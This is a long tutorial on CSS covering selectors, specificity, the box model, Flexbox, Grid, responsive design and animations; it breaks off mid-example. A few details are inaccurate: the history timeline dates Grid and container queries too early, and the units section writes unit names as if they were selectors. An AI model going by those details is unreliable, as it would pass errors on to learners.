# FAANG-Level Technical Guide: CSS (Cascading Style Sheets)

## 1. Introduction

### What is CSS?

**Simple Analogy:** Think of CSS as the interior designer of a house built with HTML. HTML provides the structure (walls, doors, windows), while CSS adds the paint, furniture, lighting, and decorations that make the space beautiful and functional.

**Technical Explanation:** CSS (Cascading Style Sheets) is a declarative language that describes how HTML elements should be displayed on screen, paper, or other media. It controls the visual presentation of web documents through a set of styling rules that browsers interpret to render web pages.

### Why CSS Exists

CSS was created to solve the **separation of concerns** problem in web development:

- **HTML Problem:** Early HTML mixed content and presentation (`<font>`, `<center>`, `<b>` tags)
- **Maintenance Nightmare:** Changing design required editing every HTML file
- **Inconsistency:** Manual styling led to inconsistent designs across pages
- **Accessibility:** Presentational HTML reduced semantic meaning and accessibility

CSS separates **structure (HTML)** from **presentation (CSS)**, enabling:

- Consistent design across entire websites
- Easy maintenance and updates
- Better accessibility and SEO
- Responsive design for multiple devices

### The Web Development Trinity

```
HTML (Structure)     CSS (Presentation)     JavaScript (Behavior)
├── Semantic meaning ├── Visual styling    ├── Interactivity
├── Content hierarchy ├── Layout & design  ├── Dynamic updates
├── Accessibility     ├── Responsive design├── User interactions
└── SEO foundation    └── Brand consistency └── Business logic
```

**Real-world Analogy:**

- **HTML:** Building blueprint and foundation
- **CSS:** Interior design, paint, furniture, lighting
- **JavaScript:** Electrical systems, plumbing, smart home features

### Evolution of CSS

```
CSS1 (1996) → CSS2 (1998) → CSS2.1 (2011) → CSS3 (2009-2020) → Modern CSS (2020+)

Key Milestones:
├── 1996: Basic styling (colors, fonts, spacing)
├── 1998: Positioning, z-index, media types
├── 2011: Box model, selectors, tables (stable foundation)
├── 2012: Flexbox (game-changing layout system)
├── 2014: CSS Variables, Grid Layout
├── 2017: Container Queries, Scroll Snap
├── 2020+: Cascade Layers, :has(), Subgrid
```

**Industry Impact:**

- **Pre-CSS:** Table-based layouts, presentational HTML
- **CSS Era:** Semantic HTML, separation of concerns
- **Modern CSS:** Component-based architecture, design systems

## 2. Core Concepts (Fundamentals)

### Selectors: The CSS Language

Selectors are how CSS "finds" HTML elements to style. Think of them as addresses for elements.

#### Basic Selectors

```css
/* Type Selector - targets all elements of a type */
p {
  color: black;
}

/* Class Selector - targets elements with specific class */
.highlight {
  background: yellow;
}

/* ID Selector - targets unique element */
#header {
  position: fixed;
}

/* Universal Selector - targets everything */
* {
  box-sizing: border-box;
}
```

#### Advanced Selectors

```css
/* Attribute Selectors */
input[type="text"] {
  border: 1px solid #ccc;
}
[data-theme="dark"] {
  background: #1a1a1a;
}
[class*="button-"] {
  cursor: pointer;
}

/* Pseudo-classes - state-based selection */
button:hover {
  transform: scale(1.05);
}
input:focus {
  outline: 2px solid blue;
}
li:first-child {
  font-weight: bold;
}
tr:nth-child(even) {
  background: #f5f5f5;
}

/* Pseudo-elements - style parts of elements */
p::before {
  content: "→ ";
}
p::after {
  content: ".";
}
input::placeholder {
  color: #999;
}
```

#### Combinators

```css
/* Descendant (space) - nested elements */
article p {
  line-height: 1.6;
}

/* Child (>) - direct children only */
ul > li {
  list-style: none;
}

/* Adjacent Sibling (+) - immediately following */
h1 + p {
  font-size: 1.2em;
}

/* General Sibling (~) - following siblings */
h2 ~ p {
  margin-top: 0;
}
```

### Specificity: The CSS Hierarchy

Specificity determines which CSS rule wins when multiple rules target the same element.

**Specificity Score (High to Low):**

1. **Inline styles** - `style="color: red;"` (1000 points)
2. **ID selectors** - `#header` (100 points)
3. **Class/Attribute/Pseudo** - `.class`, `[type]`, `:hover` (10 points)
4. **Element selectors** - `div`, `p` (1 point)
5. **Universal selector** - `*` (0 points)

```
Example Calculation:
button.btn.primary:hover
= Element (button) + Class (.btn) + Class (.primary) + Pseudo-class (:hover)
= 1 + 10 + 10 + 10 = 31 points

#nav .menu-item
= ID (#nav) + Class (.menu-item)
= 100 + 10 = 110 points (wins!)
```

**Best Practice:** Use low-specificity selectors for maintainability:

```css
/* Good - reusable, low specificity */
.card {
  padding: 1rem;
}
.card--large {
  padding: 2rem;
}

/* Avoid - too specific */
.container .main .content .card {
  padding: 1rem;
}
```

### Cascade: How CSS Rules Combine

The cascade algorithm determines final styles through three factors:

1. **Origin & Importance** (highest to lowest):
   - `!important` user styles
   - `!important` author styles
   - Author styles
   - User default styles
   - Browser default styles

2. **Specificity** (as calculated above)

3. **Source Order** (last rule wins if equal specificity)

```css
/* Example: Cascade in action */
p {
  color: blue;
} /* Author style */
p {
  color: red !important;
} /* Important author style - wins */
p {
  color: green;
} /* Same specificity, comes later - would win if no !important */
```

### Inheritance: Properties Flow Down

Some properties automatically inherit from parent elements:

**Inherited Properties:**

- `font-family`, `font-size`, `font-weight`, `color`
- `text-align`, `line-height`, `letter-spacing`
- `visibility`, `cursor`

**Non-inherited Properties:**

- `margin`, `padding`, `border`
- `width`, `height`, `background`
- `position`, `display`, `float`

```css
/* Inheritance example */
body {
  font-family: Arial, sans-serif; /* All text inherits this */
  color: #333; /* All text inherits this */
}

p {
  /* Inherits font-family and color from body */
  margin: 1rem 0; /* Not inherited - must be explicit */
}
```

### Box Model: The Foundation of Layout

Every element is a rectangular box with four layers:

```
┌─────────────────────────────────────┐ ← Margin (transparent)
│ ┌─────────────────────────────────┐ │
│ │ ┌─────────────────────────────┐ │ │
│ │ │  Content Area               │ │ │
│ │ │  (width × height)           │ │ │
│ │ └─────────────────────────────┘ │ │
│ │           Padding               │ │
│ └─────────────────────────────────┘ │
│             Border                  │
└─────────────────────────────────────┘
```

```css
.box {
  width: 200px; /* Content width */
  height: 100px; /* Content height */
  padding: 20px; /* Space inside border */
  border: 5px solid; /* Border around padding */
  margin: 10px; /* Space outside border */

  /* Total space taken: */
  /* Width: 200 + 20*2 + 5*2 + 10*2 = 290px */
  /* Height: 100 + 20*2 + 5*2 + 10*2 = 190px */
}
```

**Box-Sizing Property:**

```css
/* Default: content-box */
.default-box {
  box-sizing: content-box; /* width/height apply to content only */
}

/* Modern: border-box */
.modern-box {
  box-sizing: border-box; /* width/height include padding & border */
}

/* Global best practice */
*,
*::before,
*::after {
  box-sizing: border-box;
}
```

### Display Property: How Elements Behave

```css
/* Block-level - takes full width, starts new line */
.block {
  display: block;
}

/* Inline - flows with text, no width/height */
.inline {
  display: inline;
}

/* Inline-block - flows with text, respects width/height */
.inline-block {
  display: inline-block;
}

/* None - removes element from layout */
.hidden {
  display: none;
}

/* Modern values */
.flex {
  display: flex;
}
.grid {
  display: grid;
}
```

### Positioning: Controlling Element Placement

```css
/* Static - default positioning */
.static {
  position: static;
}

/* Relative - positioned relative to its normal position */
.relative {
  position: relative;
  top: 10px; /* Move down 10px from normal position */
  left: 20px; /* Move right 20px from normal position */
}

/* Absolute - positioned relative to nearest positioned parent */
.absolute {
  position: absolute;
  top: 0; /* Pin to top of parent */
  left: 0; /* Pin to left of parent */
}

/* Fixed - positioned relative to viewport */
.fixed {
  position: fixed;
  bottom: 20px;
  right: 20px;
}

/* Sticky - toggles between relative and fixed */
.sticky {
  position: sticky;
  top: 10px; /* Sticks 10px from top when scrolling */
}
```

**Positioning Context:**

```css
/* Parent must be positioned for absolute children */
.container {
  position: relative; /* Creates positioning context */
}

.child {
  position: absolute; /* Positioned relative to .container */
  top: 0;
  left: 0;
}
```

### Units: Measuring in CSS

#### Absolute Units

```css
/* Fixed sizes - don't scale */
px {
  font-size: 16px;
} /* Pixels - screen dots */
cm {
  width: 2cm;
} /* Centimeters */
mm {
  height: 10mm;
} /* Millimeters */
in {
  margin: 1in;
} /* Inches (96px) */
```

#### Relative Units

```css
/* Font-relative */
em {
  font-size: 1.2em;
} /* Relative to parent font size */
rem {
  font-size: 1.2rem;
} /* Relative to root font size */

/* Viewport-relative */
vw {
  width: 50vw;
} /* 50% of viewport width */
vh {
  height: 100vh;
} /* 100% of viewport height */
vmin {
  font-size: 2vmin;
} /* Smaller of vw or vh */
vmax {
  font-size: 2vmax;
} /* Larger of vw or vh */

/* Percentage */
% {
  width: 80%;
} /* Relative to parent width */
```

**Best Practice:**

```css
/* Modern responsive approach */
body {
  font-size: 16px; /* Base size */
}

.component {
  font-size: 1rem; /* Uses root size */
  padding: 1rem 2rem; /* Scales with font */
  margin: 2vh 0; /* Scales with viewport */
}
```

### Colors: Visual Design Foundation

```css
/* Named colors */
.text {
  color: blue;
}

/* Hexadecimal */
.primary {
  color: #3b82f6;
} /* 6-digit */
.secondary {
  color: #3b8;
} /* 3-digit shorthand */
.with-alpha {
  color: #3b82f680;
} /* 8-digit with alpha */

/* RGB/RGBA */
.rgb {
  color: rgb(59, 130, 246);
}
.rgba {
  color: rgba(59, 130, 246, 0.8);
}

/* HSL/HSLA - more intuitive for design */
.hsl {
  color: hsl(217, 91%, 60%);
}
.hsla {
  color: hsla(217, 91%, 60%, 0.8);
}

/* Modern CSS Color Functions */
.oklch {
  color: oklch(0.65 0.15 250);
} /* Better color space */
.color-mix {
  background: color-mix(in srgb, red, blue);
}
```

### Background Properties

```css
.background {
  /* Basic background */
  background-color: #f0f0f0;
  background-image: url("pattern.svg");
  background-repeat: no-repeat;
  background-position: center;
  background-size: cover;

  /* Shorthand */
  background: #f0f0f0 url("pattern.svg") no-repeat center/cover;

  /* Multiple backgrounds */
  background:
    url("overlay.png") top left/50px 50px no-repeat,
    url("texture.jpg") repeat,
    linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.1));
}
```

### Typography: Text Styling

```css
.typography {
  /* Font properties */
  font-family: "Inter", Arial, sans-serif;
  font-size: 1rem;
  font-weight: 400;
  font-style: normal;
  font-variant: normal;

  /* Text properties */
  color: #333;
  line-height: 1.5;
  letter-spacing: 0.02em;
  word-spacing: 0.1em;
  text-align: left;
  text-decoration: none;
  text-transform: none;

  /* Modern typography */
  font-variation-settings:
    "wght" 400,
    "slnt" 0;
  font-optical-sizing: auto;
  font-feature-settings:
    "kern" 1,
    "liga" 1;
}
```

### Borders & Shadows: Depth and Emphasis

```css
.borders {
  /* Border properties */
  border: 2px solid #ccc;
  border-radius: 8px;
  border-style: solid dashed dotted double;

  /* Individual sides */
  border-top: 3px solid #333;
  border-right: 1px dashed #999;
  border-bottom: 2px dotted #666;
  border-left: 4px double #000;
}

.shadows {
  /* Box shadow */
  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);

  /* Multiple shadows */
  box-shadow:
    0 1px 3px rgba(0, 0, 0, 0.12),
    0 1px 2px rgba(0, 0, 0, 0.24),
    inset 0 1px 1px rgba(255, 255, 255, 0.5);

  /* Text shadow */
  text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3);
}
```

## 3. Layout Systems (Modern CSS)

### Flexbox: One-Dimensional Layout

Flexbox is designed for distributing space along a single axis (row or column).

#### Core Concepts

```
Flex Container (display: flex)
├── Main Axis (primary direction)
├── Cross Axis (perpendicular direction)
└── Flex Items (direct children)

Flex Container Properties:
├── flex-direction  → Sets main axis direction
├── justify-content → Aligns items on main axis
├── align-items     → Aligns items on cross axis
├── flex-wrap       → Allows items to wrap
└── gap             → Space between items

Flex Item Properties:
├── flex-grow       → How much to grow
├── flex-shrink     → How much to shrink
├── flex-basis      → Base size before growing/shrinking
├── align-self      → Override container alignment
└── order           → Change visual order
```

#### Flexbox Examples

```css
/* Basic flex container */
.flex-container {
  display: flex;
  flex-direction: row; /* row | row-reverse | column | column-reverse */
  gap: 1rem; /* Space between items */
}

/* Centering with flexbox */
.center {
  display: flex;
  justify-content: center; /* Main axis centering */
  align-items: center; /* Cross axis centering */
  height: 100vh;
}

/* Responsive navigation */
.nav {
  display: flex;
  justify-content: space-between; /* Distribute space */
  align-items: center;
  padding: 1rem;
}

.nav__logo {
  flex: 0 0 auto;
} /* Don't grow/shrink */
.nav__menu {
  flex: 1 1 auto;
} /* Grow to fill space */
.nav__cta {
  flex: 0 0 auto;
} /* Fixed size */

/* Card layout */
.card-grid {
  display: flex;
  flex-wrap: wrap; /* Allow wrapping */
  gap: 1rem;
  margin: -0.5rem; /* Negative margin for edge alignment */
}

.card {
  flex: 1 1 300px; /* Grow, shrink, base 300px */
  margin: 0.5rem; /* Counteract negative margin */
}

/* Holy grail layout */
.holy-grail {
  display: flex;
  flex-direction: column;
  min-height: 100vh;
}

.holy-grail__header,
.holy-grail__footer {
  flex: 0 0 auto; /* Fixed height */
}

.holy-grail__body {
  flex: 1 1 auto; /* Fill remaining space */
  display: flex;
}

.holy-grail__sidebar {
  flex: 0 0 200px; /* Fixed width */
}

.holy-grail__content {
  flex: 1 1 auto; /* Fill remaining space */
}
```

#### Flexbox Mental Models

**1D Layout Thinking:**

- Think in terms of "rows" or "columns"
- One axis at a time
- Content-first approach

**Common Patterns:**

```css
/* Horizontal centering */
.horizontal-center {
  display: flex;
  justify-content: center;
}

/* Vertical centering */
.vertical-center {
  display: flex;
  align-items: center;
}

/* Perfect centering */
.perfect-center {
  display: flex;
  justify-content: center;
  align-items: center;
}

/* Equal height columns */
.equal-height {
  display: flex;
}

/* Spaced items */
.spaced-items {
  display: flex;
  justify-content: space-between; /* or space-around, space-evenly */
}
```

### CSS Grid: Two-Dimensional Layout

Grid is designed for complex two-dimensional layouts with rows and columns.

#### Core Concepts

```
Grid Container (display: grid)
├── Grid Lines (horizontal and vertical)
├── Grid Tracks (rows and columns)
├── Grid Cells (intersection of row and column)
├── Grid Areas (rectangular group of cells)
└── Grid Items (direct children)

Grid Container Properties:
├── grid-template-columns → Define column tracks
├── grid-template-rows    → Define row tracks
├── grid-template-areas   → Named grid areas
├── gap                   → Space between tracks
├── justify-items         → Align items in cells
├── align-items           → Align items in cells
└── place-items           → Shorthand for both

Grid Item Properties:
├── grid-column-start/end → Column placement
├── grid-row-start/end    → Row placement
├── grid-area             → Named area placement
├── justify-self          → Override container alignment
├── align-self            → Override container alignment
└── place-self            → Shorthand for both
```

#### Grid Examples

```css
/* Basic grid */
.grid {
  display: grid;
  grid-template-columns: 1fr 1fr 1fr; /* 3 equal columns */
  grid-template-rows: auto auto; /* 2 auto-height rows */
  gap: 1rem;
}

/* Responsive grid */
.responsive-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
  gap: 1rem;
}

/* Named grid template */
.layout-grid {
  display: grid;
  grid-template-areas:
    "header header header"
    "sidebar main aside"
    "footer footer footer";
  grid-template-columns: 200px 1fr 200px;
  grid-template-rows: auto 1fr auto;
  min-height: 100vh;
  gap: 1rem;
}

.header {
  grid-area: header;
}
.sidebar {
  grid-area: sidebar;
}
.main {
  grid-area: main;
}
.aside {
  grid-area: aside;
}
.footer {
  grid-area: footer;
}

/* Complex card layout */
.card-grid {
  display: grid;
  grid-template-columns: repeat(4, 1fr);
  grid-auto-rows: minmax(100px, auto);
  gap: 1rem;
}

.card--featured {
  grid-column: span 2;
  grid-row: span 2;
}

.card--wide {
  grid-column: span 2;
}

/* Asymmetric layout */
.asymmetric {
  display: grid;
  grid-template-columns: 2fr 1fr 1fr;
  grid-template-rows: auto 1fr auto;
  gap: 1rem;
}

/* Grid with explicit line placement */
.line-placement {
  display: grid;
  grid-template-columns: 1fr 2fr 1fr;
  grid-template-rows: auto 1fr auto;
}

.item-1 {
  grid-column: 1 / 4; /* From line 1 to line 4 */
  grid-row: 1 / 2; /* From line 1 to line 2 */
}

.item-2 {
  grid-column: 1 / 2;
  grid-row: 2 / 4;
}
```

#### Grid Mental Models

**2D Layout Thinking:**

- Think in terms of "rows AND columns"
- Design the grid first, then place items
- Layout-first approach

**Grid vs Flexbox Decision:**

```css
/* Use Flexbox for: */
- 1D layouts (single row or column)
- Component-level alignment
- Content distribution
- Navigation bars, form controls

/* Use Grid for: */
- 2D layouts (rows AND columns)
- Overall page layout
- Complex grid systems
- Dashboard layouts
```

### Float: Legacy Layout Context

While largely replaced by Flexbox and Grid, understanding float is important for maintaining legacy code.

```css
/* Basic float */
.float-left {
  float: left;
}
.float-right {
  float: right;
}
.clearfix {
  clear: both;
}

/* Modern clearfix */
.clearfix::after {
  content: "";
  display: table;
  clear: both;
}

/* Legacy layout pattern */
.legacy-layout {
  width: 100%;
}

.legacy-sidebar {
  float: left;
  width: 25%;
}

.legacy-content {
  float: right;
  width: 75%;
}

.legacy-footer {
  clear: both;
}
```

### Multi-column Layout

```css
/* Newspaper-style columns */
.multicolumn {
  column-count: 3;
  column-gap: 2rem;
  column-rule: 1px solid #ccc;
}

/* Responsive columns */
.responsive-columns {
  column-width: 200px;
  column-count: auto; /* Browser calculates */
}

/* Column spans */
.multicolumn h2 {
  column-span: all; /* Spans all columns */
  break-after: column; /* Force column break */
}
```

### Alignment Systems

#### Modern Alignment Properties

```css
/* Box Alignment (works with flexbox, grid, block) */
.alignment-demo {
  display: flex;
  justify-content: center; /* Main axis */
  align-items: center; /* Cross axis */
  place-content: center; /* Both axes (grid) */
  place-items: center; /* Both axes (grid) */
}

/* Individual item alignment */
.item {
  justify-self: start; /* Override main axis */
  align-self: end; /* Override cross axis */
  place-self: center end; /* Both axes */
}

/* Gap property (modern spacing) */
.modern-gap {
  display: grid;
  grid-template-columns: 1fr 1fr 1fr;
  gap: 1rem; /* Rows and columns */
  row-gap: 0.5rem; /* Row gap only */
  column-gap: 1.5rem; /* Column gap only */
}
```

### Responsive Design

#### Media Queries

```css
/* Basic media query */
.responsive {
  /* Mobile-first base styles */
  padding: 1rem;
}

/* Tablet styles */
@media (min-width: 768px) {
  .responsive {
    padding: 2rem;
  }
}

/* Desktop styles */
@media (min-width: 1024px) {
  .responsive {
    padding: 3rem;
  }
}

/* Complex media queries */
@media (min-width: 768px) and (max-width: 1023px) {
  /* Tablet-specific styles */
}

@media (orientation: landscape) {
  /* Landscape orientation */
}

@media (prefers-reduced-motion: reduce) {
  /* Respect user preferences */
  * {
    animation-duration: 0.01ms !important;
    animation-iteration-count: 1 !important;
    transition-duration: 0.01ms !important;
  }
}

@media (prefers-color-scheme: dark) {
  /* Dark mode preference */
  body {
    background: #1a1a1a;
    color: #ffffff;
  }
}
```

#### Container Queries (Modern)

```css
/* Container setup */
.card-container {
  container-type: inline-size;
  container-name: card;
}

/* Container queries */
@container card (min-width: 300px) {
  .card {
    display: flex;
    align-items: center;
  }
}

@container card (min-width: 500px) {
  .card {
    padding: 2rem;
  }

  .card__image {
    flex: 0 0 150px;
  }
}
```

#### Responsive Typography

```css
/* Fluid typography */
.fluid-text {
  font-size: clamp(1rem, 2.5vw, 2rem);
  line-height: clamp(1.4, 3vw, 1.6);
}

/* Responsive spacing */
.responsive-spacing {
  padding: clamp(1rem, 5vw, 3rem);
  margin: clamp(0.5rem, 2.5vw, 1.5rem) 0;
}

/* Component-based responsive design */
.responsive-component {
  /* Base (mobile) */
  display: block;
  padding: 1rem;
}

@media (min-width: 768px) {
  .responsive-component {
    display: flex;
    align-items: center;
    gap: 2rem;
    padding: 2rem;
  }
}

@media (min-width: 1024px) {
  .responsive-component {
    padding: 3rem;
    gap: 3rem;
  }
}
```

### Layout Architecture Patterns

#### Component-Based Layout

```css
/* Atomic design approach */
.atom {
  /* Smallest components */
}
.molecule {
  /* Groups of atoms */
}
.organism {
  /* Groups of molecules */
}
.template {
  /* Page layouts */
}
.page {
  /* Complete pages */
}

/* Layout components */
.layout-container {
  max-width: 1200px;
  margin: 0 auto;
  padding: 0 1rem;
}

.layout-grid {
  display: grid;
  grid-template-columns: repeat(12, 1fr);
  gap: 1rem;
}

.layout-span-6 {
  grid-column: span 6;
}
.layout-span-8 {
  grid-column: span 8;
}
.layout-span-12 {
  grid-column: span 12;
}
```

#### Responsive Grid System

```css
/* Modern grid system */
.grid-system {
  display: grid;
  grid-template-columns: repeat(12, 1fr);
  gap: 1rem;
}

/* Responsive breakpoints */
@media (max-width: 767px) {
  .grid-system {
    grid-template-columns: 1fr; /* Stack on mobile */
  }
}

/* Usage classes */
.col-1 {
  grid-column: span 1;
}
.col-2 {
  grid-column: span 2;
}
.col-3 {
  grid-column: span 3;
}
/* ... */
.col-12 {
  grid-column: span 12;
}

/* Responsive columns */
.col-md-6 {
  /* Medium screens */
}
@media (min-width: 768px) {
  .col-md-6 {
    grid-column: span 6;
  }
}

.col-lg-4 {
  /* Large screens */
}
@media (min-width: 1024px) {
  .col-lg-4 {
    grid-column: span 4;
  }
}
```


_Sections 1-3 complete. This guide progresses from fundamental concepts to modern layout systems, providing both beginner-friendly explanations and senior-level technical depth. Each concept includes real-world examples and best practices used in production applications._



## 4. Advanced Styling Capabilities

### Transitions: Smooth State Changes

Transitions create smooth animations between property states.

```css
/* Basic transition */
.button {
  background: blue;
  color: white;
  padding: 1rem 2rem;
  border: none;
  border-radius: 4px;

  /* Transition properties */
  transition:
    background 0.3s ease,
    transform 0.2s ease;
}

.button:hover {
  background: darkblue;
  transform: translateY(-2px);
}

/* Advanced transition */
.card {
  transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
}

.card:hover {
  transform: scale(1.05) translateY(-5px);
  box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
}

/* Transition timing functions */
.ease-linear {
  transition-timing-function: linear;
}
.ease-ease {
  transition-timing-function: ease;
}
.ease-in {
  transition-timing-function: ease-in;
}
.ease-out {
  transition-timing-function: ease-out;
}
.ease-in-out {
  transition-timing-function: ease-in-out;
}
.custom-curve {
  transition-timing-function: cubic-bezier(0.68, -0.55, 0.265, 1.55);
}
````

### Animations: Complex Movement

Animations allow multi-step, reusable animations with keyframes.

```css
/* Basic animation */
@keyframes fadeIn {
  from {
    opacity: 0;
  }
  to {
    opacity: 1;
  }
}

@keyframes slideIn {
  from {
    transform: translateX(-100%);
    opacity: 0;
  }
  to {
    transform: translateX(0);
    opacity: 1;
  }
}

@keyframes pulse {
  0%,
  100% {
    transform: scale(1);
  }
  50% {
    transform: scale(1.1);
  }
}

@keyframes complex {
  0% {
    transform: rotate(0deg) scale(1);
    background: blue;
  }
  25% {
    transform: rotate(90deg) scale(1.2);
    background: red;
  }
  50% {
    transform: rotate(180deg) scale(1);
    background: green;
  }
  75% {
    transform: rotate(270deg) scale(0.8);
    background: yellow;
  }
  100% {
    transform: rotate(360deg) scale(1);
    background: blue;
  }
}

/* Animation usage */
.animated-element {
  animation: fadeIn 0.5s ease-in-out;
}

.complex-animation {
  animation: complex 3s ease-in-out infinite;
}

/* Animation properties */
.animation-controls {
  animation-name: slideIn;
  animation-duration: 0.5s;
  animation-timing-function: ease-out;
  animation-delay: 0.2s;
  animation-iteration-count: 3;
  animation-direction: alternate;
  animation-fill-mode: forwards;
  animation-play-state: running;
}

/* Performance-optimized animations */
.gpu-accelerated {
  /* These properties trigger GPU acceleration */
  transform: translateZ(0);
  will-change: transform, opacity;

  animation: slideIn 0.3s ease-out;
}
```

### Transform: Element Manipulation

Transforms modify element positioning and appearance without affecting layout.

```css
/* 2D transforms */
.transform-2d {
  /* Translation */
  transform: translateX(50px);
  transform: translateY(20px);
  transform: translate(50px, 20px);

  /* Rotation */
  transform: rotate(45deg);

  /* Scaling */
  transform: scale(1.5);
  transform: scaleX(2);
  transform: scaleY(0.5);

  /* Skewing */
  transform: skewX(15deg);
  transform: skewY(10deg);

  /* Combined */
  transform: translate(50px, 20px) rotate(45deg) scale(1.2);
}

/* 3D transforms */
.transform-3d {
  /* 3D translation */
  transform: translate3d(50px, 20px, 100px);

  /* 3D rotation */
  transform: rotateX(45deg);
  transform: rotateY(30deg);
  transform: rotateZ(15deg);
  transform: rotate3d(1, 1, 0, 45deg);

  /* 3D scaling */
  transform: scale3d(1.5, 1.2, 0.8);

  /* Perspective */
  perspective: 1000px;
  transform: rotateY(45deg);
}

/* Transform origin */
.transform-origin {
  transform-origin: center center; /* Default */
  transform-origin: top left;
  transform-origin: 50% 50%;
  transform-origin: 10px 20px;
}
```

### Filters: Visual Effects

Filters apply graphical effects like blur, brightness, and color manipulation.

```css
/* Basic filters */
.filter-basic {
  filter: blur(5px);
  filter: brightness(1.2);
  filter: contrast(1.5);
  filter: grayscale(100%);
  filter: sepia(100%);
  filter: saturate(200%);
  filter: hue-rotate(90deg);
  filter: invert(100%);
  filter: opacity(0.5);
}

/* Combined filters */
.filter-combined {
  filter: contrast(1.2) brightness(1.1) saturate(1.2);
}

/* Backdrop filter (background blur) */
.backdrop-blur {
  backdrop-filter: blur(10px);
  background: rgba(255, 255, 255, 0.8);
}

/* SVG filters */
.svg-filter {
  filter: url(#custom-filter);
}
```

### Custom Properties (CSS Variables)

CSS variables enable dynamic, reusable values with cascade behavior.

```css
/* Global variables */
:root {
  /* Colors */
  --primary-color: #3b82f6;
  --secondary-color: #64748b;
  --success-color: #10b981;
  --warning-color: #f59e0b;
  --error-color: #ef4444;

  /* Typography */
  --font-family-base: "Inter", system-ui, sans-serif;
  --font-size-base: 1rem;
  --font-size-lg: 1.125rem;
  --font-size-xl: 1.25rem;

  /* Spacing */
  --spacing-xs: 0.25rem;
  --spacing-sm: 0.5rem;
  --spacing-md: 1rem;
  --spacing-lg: 1.5rem;
  --spacing-xl: 2rem;

  /* Shadows */
  --shadow-sm: 0 1px 2px rgba(0, 0, 0, 0.05);
  --shadow-md: 0 4px 6px rgba(0, 0, 0, 0.1);
  --shadow-lg: 0 10px 15px rgba(0, 0, 0, 0.1);

  /* Borders */
  --border-radius-sm: 0.25rem;
  --border-radius-md: 0.5rem;
  --border-radius-lg: 1rem;
}

/* Component variables */
.card {
  --card-padding: var(--spacing-lg);
  --card-background: white;
  --card-border: 1px solid #e5e7eb;
  --card-shadow: var(--shadow-md);

  padding: var(--card-padding);
  background: var(--card-background);
  border: var(--card-border);
  box-shadow: var(--card-shadow);
}

.card--dark {
  --card-background: #1f2937;
  --card-border: 1px solid #374151;
}

/* Dynamic variables with JavaScript */
.dynamic-theme {
  --theme-primary: #3b82f6; /* Can be updated via JS */
  --theme-background: white;
}

/* Variable fallbacks */
.fallback {
  color: var(--primary-color, blue); /* Fallback to blue if variable not set */
}

/* Calculations with variables */
.calculated {
  padding: calc(var(--spacing-md) * 2);
  font-size: calc(var(--font-size-base) * 1.2);
}
```

### Advanced Functions

#### calc() - Mathematical Calculations

```css
.calculations {
  /* Basic arithmetic */
  width: calc(100% - 2rem);
  height: calc(50vh + 20px);
  margin: calc(var(--spacing-md) * 1.5);

  /* Complex calculations */
  font-size: calc((16px + 1vw) / 2);
  padding: calc(1rem + 2%);

  /* Mixed units */
  max-width: calc(800px + 10%);
  min-height: calc(100vh - var(--header-height));

  /* Viewport-based calculations */
  font-size: calc(16px + 0.5vw);
  line-height: calc(1.2 + 0.5vh);
}
```

#### clamp() - Responsive Values

```css
.clamp-values {
  /* clamp(min, preferred, max) */
  font-size: clamp(1rem, 2.5vw, 2rem);
  padding: clamp(1rem, 5vw, 3rem);
  margin: clamp(0.5rem, 2.5vw, 1.5rem);

  /* Fluid typography */
  h1 {
    font-size: clamp(2rem, 5vw, 4rem);
  }
  h2 {
    font-size: clamp(1.5rem, 4vw, 3rem);
  }
  h3 {
    font-size: clamp(1.25rem, 3vw, 2rem);
  }

  /* Fluid spacing */
  .section {
    padding: clamp(2rem, 10vh, 8rem) 0;
  }

  /* Fluid layouts */
  .container {
    max-width: clamp(320px, 90%, 1200px);
    margin: 0 auto;
  }
}
```

#### min() and max() - Value Constraints

```css
.constraint-functions {
  /* max() - use largest value */
  width: max(50%, 300px); /* At least 300px, but 50% if larger */
  font-size: max(16px, 1rem); /* At least 16px */

  /* min() - use smallest value */
  width: min(100%, 1200px); /* At most 1200px */
  font-size: min(2rem, 5vw); /* At most 2rem */

  /* Combined with calc() */
  width: min(calc(100% - 4rem), 800px);
  height: max(50vh, 400px);
}
```

### Aspect Ratio

```css
.aspect-ratio {
  /* Fixed aspect ratios */
  aspect-ratio: 16 / 9; /* Widescreen */
  aspect-ratio: 4 / 3; /* Standard video */
  aspect-ratio: 1 / 1; /* Square */
  aspect-ratio: 2 / 1; /* Wide */

  /* Responsive images */
  .responsive-image {
    width: 100%;
    aspect-ratio: 16 / 9;
    object-fit: cover;
  }

  /* Video containers */
  .video-container {
    position: relative;
    width: 100%;
    aspect-ratio: 16 / 9;
  }

  .video-container iframe {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
  }

  /* Card with consistent aspect ratio */
  .card-image {
    aspect-ratio: 16 / 9;
    overflow: hidden;
  }

  .card-image img {
    width: 100%;
    height: 100%;
    object-fit: cover;
  }
}
```

### Object Fit

```css
.object-fit {
  width: 200px;
  height: 200px;
  border: 2px solid #ccc;
}

.object-fit-contain {
  object-fit: contain;
} /* Fit entire image */
.object-fit-cover {
  object-fit: cover;
} /* Fill container */
.object-fit-fill {
  object-fit: fill;
} /* Stretch to fill */
.object-fit-scale-down {
  object-fit: scale-down;
} /* Smaller of contain/none */
.object-fit-none {
  object-fit: none;
} /* Original size */

/* Position within container */
.object-position {
  object-fit: cover;
  object-position: center center; /* Default */
  object-position: top left;
  object-position: 25% 75%;
}
```

### Scroll Behavior

```css
/* Smooth scrolling */
html {
  scroll-behavior: smooth;
}

/* Custom scrollbar */
.custom-scrollbar {
  scrollbar-width: thin; /* Firefox */
  scrollbar-color: #888 #f1f1f1; /* Firefox */
}

.custom-scrollbar::-webkit-scrollbar {
  width: 8px; /* Chrome/Safari */
}

.custom-scrollbar::-webkit-scrollbar-track {
  background: #f1f1f1;
}

.custom-scrollbar::-webkit-scrollbar-thumb {
  background: #888;
  border-radius: 4px;
}

.custom-scrollbar::-webkit-scrollbar-thumb:hover {
  background: #555;
}

/* Scroll snap */
.scroll-snap-container {
  display: flex;
  overflow-x: auto;
  scroll-snap-type: x mandatory;
  scroll-behavior: smooth;
}

.scroll-snap-item {
  flex: 0 0 100%;
  scroll-snap-align: start;
}

/* Scroll-driven animations */
@keyframes fade-in-on-scroll {
  from {
    opacity: 0;
    transform: translateY(20px);
  }
  to {
    opacity: 1;
